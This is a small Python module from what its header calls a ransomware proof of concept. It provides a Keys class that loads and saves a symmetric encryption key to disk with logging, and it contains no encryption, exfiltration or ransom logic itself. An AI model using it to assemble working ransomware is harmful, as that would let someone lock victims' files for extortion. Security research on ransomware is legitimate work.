# Key management utilities for ransomware PoC
from cryptography.fernet import Fernet
from ransomware.logging import logger

class Keys:
    """
    Utility class for loading and saving encryption keys to disk.
    """
    @staticmethod
    def load_key(path: str) -> bytes:
        """
        Load a symmetric encryption key from the specified file path.
        """
        with open(path, 'rb') as f:
            key = f.read()
        logger.info(f"Loaded key from {path}")
        return key

    @staticmethod
    def save_key(path: str, key: bytes) -> None:
        """
        Save a symmetric encryption key to the specified file path.
        """
        with open(path, 'wb') as f:
            f.write(key)
        logger.info(f"Saved key to {path}") 